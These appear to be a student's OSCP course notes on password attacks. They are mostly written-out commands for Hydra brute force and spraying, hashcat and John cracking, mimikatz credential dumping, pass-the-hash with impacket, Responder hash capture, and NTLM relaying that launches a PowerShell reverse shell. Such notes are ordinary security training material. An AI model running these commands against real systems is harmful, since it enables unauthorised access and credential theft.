steps.passwordAttacks

names

ls -la  /usr/share/wordlists/dirb/others/
total 80
-rw-r--r-- 1 root root  9030 Apr  8  2010 best1050.txt
-rw-r--r-- 1 root root   959 Apr  1  2010 best110.txt
-rw-r--r-- 1 root root   124 Mar 31  2010 best15.txt
-rw-r--r-- 1 root root 60266 Oct 19  2003 names.txt



Hydra (p427)

also reference master command list for Hydra

SSH  single user

sudo hydra -l george -P /usr/share/wordlists/rockyou.txt -s <port>  ssh://<target>


RDP password spray
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://<target>


HTTP POST Login Form (p428)

 hydra -l user -P /usr/share/wordlists/rockyou.txt <target> 




Password Cracking 

    crackstation.net   https://crackstation.net/

    Mutating Wordlists (p437)

    hashcat mutate wordlists

    rules available
    ls -la /usr/share/hashcat/rules/

    if it comes it - 
    $ to append a character or 
    ^ to prefix a character 
    Both of these functions expect one character after the function  selector.
    prefix   a  “3”  to  every  password  with this rule   
    ^3


    Cracking Methodology (p441)

    Extract hashes and identify type 
    hash-identifier   
    hashid 




  Working with keypass (p) 446

  keepass2john Database.kdbx > keepass.hash
  remove "Database:" from beginning of created hash file 
  
  hashcat --help | grep -i "KeePass"     #get the hash type 
    13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)         | Password Manager

  hashcat -m 13400 keepass.hash 



  SSH Private Key Passphrase

  chmod 600 harvested-id_rsa    # set proper permissions 
  ssh2john harvested-id_rsa > ssh.hash 

  cat ssh.hash
   id_rsa:$sshng$6$16$7059e78a      #“$6$” signifies SHA-512
  
  identify 
    hashcat -h | grep -i "ssh"  
    ... 
    10300 | SAP CODVN H (PWDSALTEDHASH) iSSHA-1                 | Enterprise Application 
    Software (EAS) 
    22911 | RSA/DSA/EC/OpenSSH Private Keys ($0$)               | Private Key 
    22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$)               | Private Key 
    22931 | RSA/DSA/EC/OpenSSH Private Keys ($1, $3$)           | Private Key 
    22941 | RSA/DSA/EC/OpenSSH Private Keys ($4$)               | Private Key 
    22951 | RSA/DSA/EC/OpenSSH Private Keys ($5$)               | Private Key 


    crack it 

    haschat does not like the SSH stuff so we use JtR (p453)


    john --wordlist=ssh.passwords --rules=sshRules ssh.hash

    now go use it 


    

Cracking NTLM
    mimikatz dance  (P455) 

    id need # standard for admin something we hope to find for non admin ... 

    SeDebugPrivilege
    SeImpersonatePrivilege

    privilege::debug
    token::elevate
    lsadump::sam
    sekurlsa::logonpasswords

    lsadump::dcsync /domain:relia.com /user:Administrator


    crack harvested NTLM hash 

    hashcat -m 1000 <harvested>.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force


Passing NTLM  (PTH)
    p(460)

    smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b

    impacket likes "LMHash:NTHash"  format
    LMHash is just 32 0's
            the format  |    LMHash                     |   NThash
    impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212 

    Note
    psexec.py, will always receive a shell as SYSTEM instead of the user we used to authenticate

    impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212 

    Note 
    wmiexec.py to obtain a shell as the user we 
    used for authentication


Capture and crack Net-NTLMv2 hash (p465)

    Responder

        to respond to the directory request from the windows client

        sudo responder -I tun0

        On target 

        dir \\attackerIP\test

        stuff responder output into file userName.hash

        hashcat -m 5600 userName.hash /usr/share/wordlists/rockyou.txt --force


Relaying Net-NTLMv2

impacket-ntlmrelayx  (p470)

sending  PowerShell b64'd reverse shell one-liner  (have nc listener started )

sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 
-c "powershell -enc JABjAGwAaQBlAG4AdA..."




The NTLMv2 hash Responder

[SMB] NTLMv2-SSP Hash     : offsec::OSCP:47782f0f132b6bd5:DBCBBB6C3BEB0FE13E7FB855D8C73ED8


1. **Username and Domain:**
   - `offsec::OSCP` represents the username (`offsec`) and domain (`OSCP`).

2. **Challenge:**
   - `47782f0f132b6bd5` is the challenge received from the server during the authentication process.

3. **Response:**
   - `DBCBBB6C3BEB0FE13E7FB855D8C73ED8` is the response generated by the client using the user's password hash.

